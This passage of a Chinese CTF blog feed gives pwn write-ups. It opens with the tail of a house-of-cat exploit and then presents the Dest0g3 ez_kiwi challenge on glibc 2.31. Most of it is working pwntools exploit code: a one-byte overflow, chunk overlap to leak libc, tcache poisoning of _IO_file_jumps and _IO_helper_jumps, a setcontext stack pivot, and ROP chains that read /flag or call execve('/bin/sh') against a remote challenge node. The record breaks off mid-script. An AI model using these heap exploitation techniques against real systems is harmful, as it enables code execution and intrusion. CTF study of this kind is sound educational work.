<span class="hljs-number">0x142c92</span><br>pop_rax = libcbase + <span class="hljs-number">0x36174</span><br>ret = libcbase + <span class="hljs-number">0x22679</span><br>syscall_ret = libcbase + <span class="hljs-number">0x630a9</span><br>setcontext = libcbase + <span class="hljs-number">347936</span><br>mp = libcbase + <span class="hljs-number">2015944</span><br><br>add(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp))<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-comment">#print(hex(heap_addr))</span><br>orw = p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(pop_rax) + p64(<span class="hljs-number">257</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br><br>payload = <span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0xc0</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += orw<br>edit(<span class="hljs-number">0</span>, payload)<br><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE += p64(magic_gadget)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(-<span class="hljs-number">8</span>).encode())<br><br>p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, fake_IO_FILE)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>关于house of cat我没有讲的太详细，大家可以参考看雪大佬的这篇文章<a href="https://bbs.pediy.com/thread-273895.htm">https://bbs.pediy.com/thread-273895.htm</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Dest0g3 520迎新赛 pwn ez_kiwi</title>
    <link href="/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/"/>
    <url>/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/</url>
    
    <content type="html"><![CDATA[<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>题目环境：glibc-2.31</p><p>如图在edit的过程中对重新输入的字符长度未有效检查，造成单字节溢出。</p><p><img src="/img/1/1.png"></p><p> 这时我们就可利用这一漏洞让堆块重叠，从而泄漏libc的地址</p><p>泄漏libc的地址首先想到的就是unsorted bin中的main_arena，由于存在tcache，必须释放8个大小相同才会进入unsorted bin；在add的过程中输入的idx可以小于0xf，但实际上超过9就无法正常申请，所以我们在申请释放时要小心堆块不够和top chunk的合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):          <br>    add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#重叠的堆块</span><br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#先释放进入tcache，不会top chunk的合并</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>这时就可以得到libc的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br></code></pre></td></tr></table></figure><p>一般情况下我们会修改tcache的fd指针，指向<code>__malloc_hook</code>和<code>__free_hook</code>,再次申请时就使用system或者one_gadget去填充该地址。但是这题故意不让你去这样去使用，每次重新开始循环时会调用clear函数将<code>__malloc_hook</code>和<code>__free_hook</code>全部重置为0。</p><img src="/img/1/2.png"  /><p><img src="/img/1/3.png"></p><h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>这时我们就需要使用house of kiwi这种方式，修改<code>_IO_file_sync</code>和<code>_IO_helper_jumps</code>中的值。</p><p>具体过程便是触发<code>__malloc_assert</code>后，去执行fflush (stderr)，会使用<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>，RDX寄存器的值为<code>IO_helper_jumps</code>指针,RDX始终是一个固定的地址。</p><img src="/img/1/5.png"><p>然后<strong>通过 setcontext 控制寄存器的值</strong>。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; disassemble setcontext<br>   <span class="hljs-number">0x00007f38b563d0dd</span> &lt;+<span class="hljs-number">61</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa0</span>]#利用代码<br>   <span class="hljs-number">0x00007f38b563d0e4</span> &lt;+<span class="hljs-number">68</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x00007f38b563d0eb</span> &lt;+<span class="hljs-number">75</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x78</span>]<br>   <span class="hljs-number">0x00007f38b563d0ef</span> &lt;+<span class="hljs-number">79</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x48</span>]<br>   <span class="hljs-number">0x00007f38b563d0f3</span> &lt;+<span class="hljs-number">83</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x50</span>]<br>   <span class="hljs-number">0x00007f38b563d0f7</span> &lt;+<span class="hljs-number">87</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x58</span>]<br>   <span class="hljs-number">0x00007f38b563d0fb</span> &lt;+<span class="hljs-number">91</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x60</span>]<br>   <span class="hljs-number">0x00007f38b563d0ff</span> &lt;+<span class="hljs-number">95</span>&gt;:    <span class="hljs-keyword">test</span>   <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">0x48</span>,<span class="hljs-number">0x2</span><br>   <span class="hljs-number">0x00007f38b563d10b</span> &lt;+<span class="hljs-number">107</span>&gt;:   <span class="hljs-keyword">je</span>     <span class="hljs-number">0x7f38b563d1c6</span> &lt;setcontext+<span class="hljs-number">294</span>&gt;<br>   …………<br>   …………<br>   <span class="hljs-number">0x00007f38b563d1c6</span> &lt;+<span class="hljs-number">294</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa8</span>]#利用代码<br>   <span class="hljs-number">0x00007f38b563d1cd</span> &lt;+<span class="hljs-number">301</span>&gt;:   <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br>   <span class="hljs-number">0x00007f38b563d1ce</span> &lt;+<span class="hljs-number">302</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x70</span>]<br>   <span class="hljs-number">0x00007f38b563d1d2</span> &lt;+<span class="hljs-number">306</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x68</span>]<br>   <span class="hljs-number">0x00007f38b563d1d6</span> &lt;+<span class="hljs-number">310</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x98</span>]<br>   <span class="hljs-number">0x00007f38b563d1dd</span> &lt;+<span class="hljs-number">317</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x28</span>]<br>   <span class="hljs-number">0x00007f38b563d1e1</span> &lt;+<span class="hljs-number">321</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x30</span>]<br>   <span class="hljs-number">0x00007f38b563d1e5</span> &lt;+<span class="hljs-number">325</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x88</span>]<br>   <span class="hljs-number">0x00007f38b563d1ec</span> &lt;+<span class="hljs-number">332</span>&gt;:   <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00007f38b563d1ee</span> &lt;+<span class="hljs-number">334</span>&gt;:   <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>设置<code>rdx + 0xa0</code>来控制rsp，也就是控制了栈的地址，通过最后的ret指令就可以执行ROP。</p><p>攻击流程如下</p><p>将<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>修改为<code>setcontext + 61</code>的地址，让程序执行setcontext中的代码；同时修改<code>_IO_helper_jumps + 0xa0 和 _IO_helper_jumps + 0xa8</code>分别存放有ROP的位置和ret指令的gadget位置。题目提供了libc文件，只需在libc中找到相应的gadget再加上libc的基地址即可，可以通过泄漏堆的地址来存放gadget。</p><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>关于IO_helper_jumps的地址寻找：由于pwntools无法从文件直接得到IO_helper_jumps的信息，于是我们可以直接通过这道题提供的libc文件利用ida中找到偏移；但如果是从pwndbg中寻找，找到的地址并不是<code>_IO_file_sync</code>中所利用的那个地址，对比下图和上图就会发现需要-0xc0才是我们所需要的地址。</p><p><img src="/img/1/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br></code></pre></td></tr></table></figure><p> 利用0x20大小的堆块重叠，可以修改tcache中的fd指针，就可对<code>IO_file_jumps</code>的地址修改，并泄漏堆的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br></code></pre></td></tr></table></figure><p>使用ROPgadget 找到相应的gadget，利用系统调用去执行execve(“&#x2F;bin&#x2F;sh”,NULL,NULL) （储存&#x2F;bin&#x2F;sh的地址自己找好偏移即可）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br></code></pre></td></tr></table></figure><p>继续利用0x20大小的堆块重叠，去修改<code>_IO_helper_jumps + 0xa0 和 _IO_helper_jumps + 0xa8</code>中的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br></code></pre></td></tr></table></figure><p>关于触发<code>__malloc_assert</code>：在top chunk不够使用时就使用sysmalloc，同时对top chunk进行一系列检查，这里我们不是为了绕过检查，而是故意让其不能通过检查。这里改变top chunk的大小，使其不能页对齐，并使用gift()函数申请0x25000大小的堆块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br></code></pre></td></tr></table></figure><p>完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ez_kiwi&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./ez_kiwi&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27690</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;give me your name:\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;How much do you want?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to put?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Tell me your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to look?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to change?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Change your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br><br>leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span 